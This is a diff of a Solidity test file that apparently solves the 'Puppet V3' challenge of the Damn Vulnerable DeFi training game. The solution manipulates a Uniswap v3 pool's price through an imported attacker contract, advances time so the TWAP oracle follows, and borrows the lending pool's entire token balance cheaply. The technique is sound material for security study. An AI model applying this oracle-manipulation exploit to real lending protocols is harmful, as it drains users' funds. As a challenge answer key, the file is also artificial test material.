@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -56,7 +57,7 @@ contract PuppetV3Challenge is Test {
 
         // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
         token = new DamnValuableToken();
-
+        
         // Create Uniswap v3 pool
         bool isWethFirst = address(weth) < address(token);
         address token0 = isWethFirst ? address(weth) : address(token);
@@ -119,7 +120,37 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        IUniswapV3Pool pool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), 
+        address(token), FEE));
+        weth.deposit{value:PLAYER_INITIAL_ETH_BALANCE}();
+        Attacker attacker = new Attacker(address(token), address(weth), pool, positionManager);
+        weth.transfer(address(attacker), weth.balanceOf(player));
+        token.transfer(address(attacker), token.balanceOf(player));
+        attacker.attack(-100e18);
+        vm.warp(block.timestamp + 100);
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex,
+        // uint16 observationCardinality, uint16 observationCardinalityNext,
+        // uint8 feeProtocol, bool unlocked) = pool.slot0();
+        // // console.log(observationIndex);
+        // // console.log(observationCardinalityNext);
+        // // the block timestamp of the observation
+        // (uint32 blockTimestamp,
+        // // the tick accumulator, i.e. tick * time elapsed since the pool was first initialized
+        // int56 tickCumulative,
+        // // the seconds per liquidity, i.e. seconds elapsed / max(1, liquidity) since the pool was first initialized
+        // uint160 secondsPerLiquidityCumulativeX128,
+        // // whether or not the observation is initialized
+        // bool initialized) = pool.observations(2);
+        // console.log("initialized", initialized);
+        // console.log("tick", tick);
+        // console.log("cumulative", tickCumulative);
+        // // console.log(blockTimestamp);
+        // // console.log(initialized);
+        // console.log("amount", lendingPool.calculateDepositOfWETHRequired(1_000_000e18));
     }
 
     /**
